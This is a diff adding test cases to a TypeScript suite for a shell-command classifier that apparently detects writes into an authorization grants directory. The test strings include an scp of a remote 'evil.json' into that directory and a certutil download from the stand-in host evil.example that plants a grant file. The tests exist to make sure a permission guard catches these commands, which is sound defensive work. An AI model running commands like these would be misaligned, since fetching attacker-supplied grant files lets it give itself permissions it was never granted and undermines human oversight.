@@ -315,6 +315,18 @@ describe("classifyShellAuthzOps (#2944)", () => {
     // Ordinary scp / aria2c destinations stay unclassifiable.
     expect(classifyShellAuthzOps("scp host:g.json /tmp/out.json")).toEqual([]);
     expect(classifyShellAuthzOps("aria2c -o out.json -d /tmp https://example.com/a")).toEqual([]);
+    // Compound list must not drop the authz dest (Greptile P1 residual).
+    expect(
+      classifyShellAuthzOps("scp host:g.json .deft/authz/grants/evil.json ; echo ok"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("scp -o ProxyCommand=none host:g.json .deft/authz/grants/evil.json"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps(
+        "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json && echo done",
+      ),
+    ).toContain("settings");
   });
 
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
